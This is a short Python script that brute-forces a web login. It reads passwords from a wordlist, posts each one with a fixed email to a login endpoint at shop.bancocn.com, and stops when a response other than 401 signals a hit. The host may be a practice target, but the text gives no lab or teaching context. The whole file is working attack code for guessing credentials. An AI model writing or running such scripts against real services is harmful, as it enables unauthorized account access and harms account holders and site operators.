import requests

with open('wordlist.txt', 'r') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip('\n')
    data = {'email': 'teste@teste.com', 'password': password}
    try:
        response = requests.post('http://shop.bancocn.com/rest/user/login', data=data)
        code = response.status_code
        if code != 401:
            print(f'PASSWORD FOUND:[+]{code} {password}')
            break
        else:
            print(f'Trying [+] {password}')
    except:
       pass
